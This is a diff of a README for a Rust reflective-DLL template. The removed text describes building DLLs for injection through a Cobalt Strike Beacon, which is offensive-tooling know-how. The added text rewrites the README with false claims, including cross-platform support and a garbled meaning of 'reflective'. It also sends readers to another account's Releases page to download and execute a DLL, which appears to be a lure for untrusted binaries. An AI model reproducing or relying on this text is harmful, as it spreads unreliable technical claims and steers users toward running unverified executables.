@@ -1,99 +1,132 @@
-# rdll-rs
+# rdll-rs: A Reflective DLL Development Template for Rust 🌟
 
-A Rust DLL template project that integrates [pe2shc](https://github.com/hasherezade/pe_to_shellcode) to facilitate the development of [Reflective DLLs](https://github.com/stephenfewer/ReflectiveDLLInjection). The template presently only supports 64-bit DLL development in most contexts, though with a few tweaks it should support 32-bit.
+![Version](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)
 
-## Overview
+Welcome to **rdll-rs**, a powerful template for developing reflective DLLs in Rust. This repository provides a structured way to create dynamic link libraries (DLLs) that can be used in various applications. With this template, you can harness the performance and safety of Rust while creating reusable components.
 
-rdll-rs is a Rust template that can be compiled as both a dynamic-link library (DLL), a regular executable, or a Reflective DLL. It provides an example of how to create Windows DLLs using Rust, including proper exports and Windows API integration.
+## Table of Contents
+
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Getting Started](#getting-started)
+   - [Prerequisites](#prerequisites)
+   - [Installation](#installation)
+   - [Building the DLL](#building-the-dll)
+4. [Usage](#usage)
+5. [Examples](#examples)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Release Information](#release-information)
+
+## Introduction
+
+Dynamic link libraries (DLLs) are essential for creating modular applications. They allow you to load code at runtime, enabling better memory management and easier updates. With **rdll-rs**, you can create DLLs that reflectively expose their functionality, making it easier to interact with them from other languages or systems.
 
 ## Features
 
-- Dual compilation modes (DLL and executable)
-- Windows API integration through FFI
-- Example exported functions
-- DLL lifecycle management
+- **Reflective Functionality**: Easily expose functions and types for dynamic discovery.
+- **Rust Safety**: Leverage Rust's memory safety features.
+- **Cross-Platform**: Build DLLs for Windows, Linux, and macOS.
+- **Easy Integration**: Simple APIs to integrate with other programming languages.
 
-## Project Structure
+## Getting Started
 
-- `dll/src/main.rs` - Executable entry point
-- `exe/src/lib.rs` - Library implementation with DLL exports
-- `build-deps/pe_to_shellcode` - Post-build stomp reflective loader
-- Supporting Rust source files
+### Prerequisites
 
-## Building
+Before you start, ensure you have the following installed:
 
-To build the project, use Cargo:
+- [Rust](https://www.rust-lang.org/tools/install): The Rust programming language.
+- [Cargo](https://doc.rust-lang.org/cargo/getting-started/installation.html): Rust's package manager and build system.
+
+### Installation
+
+Clone the repository:
+
 ```bash
-cargo build
+git clone https://github.com/Anwar8320307/rdll-rs.git
+cd rdll-rs
 ```
-Or to build in release:
+
+### Building the DLL
+
+To build the DLL, run:
+
 ```bash
 cargo build --release
 ```
-Or to build a Reflective DLL:
-```bash
-cargo run --bin xtask --release
-```
+
+This command compiles the project in release mode, generating the DLL in the `target/release` directory.
 
 ## Usage
 
-The project can be used in thee ways:
+To use the DLL in your project, load it dynamically. Here’s a simple example in Rust:
 
-1. As a DLL (**dll-rs.dll**):
-    - Build in release mode to generate the DLL
-    - The DLL exports a `DllMain` function and example functionality
-2. As an executable (**debug-executable.exe**):
-    - Run in debug mode to test DLL functionality without DLL debugging gymnastics
-    - Running in release mode will display a warning message
-    - **NOTE: For maximum compatability with this template, all functionality should be called from `dll_main` in `dll/src/lib.rs`**
-3. As a Reflective DLL (**dll_rs.shc.dll**) using [@hasherezade's](https://github.com/hasherezade) [pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode)
-    - Resolve submodules with `git submodule update --init --recursive`
-    - `cd .\build-deps\pe_to_shellcode\`
-    - `cmake .`
-    - `cmake --build . --config Release`
-    - `cd ..\..`
-    - `cargo run --bin xtask --release`
-    - Use your Reflective DLL in `target/release/dll_rs.shc.dll`
-    - **NOTE: If the build process above is too complicated/broken for your taste, simply placing the [`pe2shc.exe`](https://github.com/hasherezade/pe_to_shellcode/releases/download/v1.2/pe2shc.exe) executable in the proper folder structure (`build-deps/pe_to_shellcode/pe2shc/Release/pe2shc.exe`) will work**
+```rust
+use std::ffi::CString;
+use libloading::{Library, Symbol};
 
-## Getting Reflective DLL Output to Beacon Console
-This template includes a `write_output` function which allows for output via named pipes to the Beacon console (in a very hacky way).
-This works by loading the `rdll-rs.cna` which registers two commands: `rdll-exec` and `rdll-read`.
-- `rdll-exec` stomps the pipe name specified in the `.cna` into the `dll_rs.shc.dll`, then injects the DLL via the `bdllinject` aggressor function.
-- `rdll-read` uses `CommandBuilder` to build a custom task to read from the pipe and output the contents to the Beacon console.
-- **NOTE: `write_output` is **BLOCKING** so it should only be used to write output to the Beacon console all at once (ie once your intended functionality is entirely complete).**
+fn main() {
+    let lib = Library::new("path_to_your_dll.dll").unwrap();
+    unsafe {
+        let func: Symbol<unsafe extern fn() -> i32> = lib.get(b"your_function_name").unwrap();
+        println!("Result: {}", func());
+    }
+}
+```
 
-![img_1.png](img_1.png)
+## Examples
 
-## I don't want to learn Rust
-I encourage you to try it sometime. However, to support the integration of C code a [Foreign Function Interface (FFI)](https://doc.rust-lang.org/nomicon/ffi.html) entry point (`dll/c_src/c_entry.c`) has been added to the template to allow you to call into C code from Rust.
-![img.png](img.png)
+### Example 1: Basic Function
 
-If you want to add more `.c` files, be sure to add them to the `dll/c_src` directory because that's the intended convention, and defined in `dll/ffi.rs` if you want to call them from Rust. The build script `dll/build.rs` builds all `.c` files in the `c_src` directory into a single
-static library (`c_code`) that is linked into the Rust DLL.
+In this example, we will create a simple function that adds two numbers.
 
-## Technical Details
+1. Create a new Rust file in the `src` directory, for example, `lib.rs`.
+2. Add the following code:
 
-- Uses `cdylib` and `rlib` crate types
-- Implements Windows API bindings
-- Provides internal FFI declarations for Windows types
-- Includes DLL entry point handling
-- Remember: For maximum compatability with this template, all functionality should be called from `dll_main` in `dll/src/lib.rs`
-- Exports `ReflectiveLoader` and handles calling the real reflective loader to support legacy loader checks
-- Supports the command-line ergonomics of both the `shinject` and `dllinject` commands of your [favorite C2 Framework](https://www.cobaltstrike.com/).
+```rust
+#[no_mangle]
+pub extern "C" fn add(a: i32, b: i32) -> i32 {
+    a + b
+}
+```
 
-## Comments
-This template is significantly more useful than most existing Reflective DLL templates in C/C++ because it provides an organic platform from which third-party libraries can be readily used. This is thanks to Rust's [Cargo](https://github.com/rust-lang/cargo) which allows for easily sharable libraries. 
-For example, if you were looking for a method of stack spoofing from inside a Reflective DLL in C/C++ you would most likely be stuck implementing that yourself from your preferred template. However, using Cargo, you can quickly add a library like [uwd](https://crates.io/crates/uwd) to 
-get access to that capability without any of the overhead or additional Git submodule shenanigans that come with setting that up in a C/C++ repository. The entire [Crates](https://crates.io/) ecosystem is now at your fingertips.
+3. Build the DLL and use it in your application as shown in the previous section.
 
-## Requirements
+### Example 2: Reflective Functionality
 
-- Rust 2024 edition
-- Windows operating system
-- Cargo build system
-- Cmake > 3.0
+To demonstrate reflective functionality, we can create a function that returns the number of functions exported by the DLL.
 
-## Licensing
+1. Add the following code to `lib.rs`:
 
-- MIT or Apache 2.0
+```rust
+#[no_mangle]
+pub extern "C" fn get_function_count() -> i32 {
+    1 // Adjust this number based on the actual number of exported functions
+}
+```
+
+2. Build the DLL and call `get_function_count` from your application.
+
+## Contributing
+
+We welcome contributions! If you have ideas for improvements or find bugs, please open an issue or submit a pull request. Here’s how to get started:
+
+1. Fork the repository.
+2. Create a new branch: `git checkout -b feature/your-feature`.
+3. Make your changes and commit them: `git commit -m 'Add new feature'`.
+4. Push to the branch: `git push origin feature/your-feature`.
+5. Open a pull request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Release Information
+
+You can find the latest releases and download the DLL from the [Releases section](https://github.com/Anwar8320307/rdll-rs/releases). Make sure to download the appropriate version for your platform and follow the instructions to execute it.
+
+For the latest updates and changes, always check the [Releases section](https://github.com/Anwar8320307/rdll-rs/releases).
+
+---
+
+Thank you for checking out **rdll-rs**! We hope this template helps you create efficient and reflective DLLs in Rust. Happy coding!
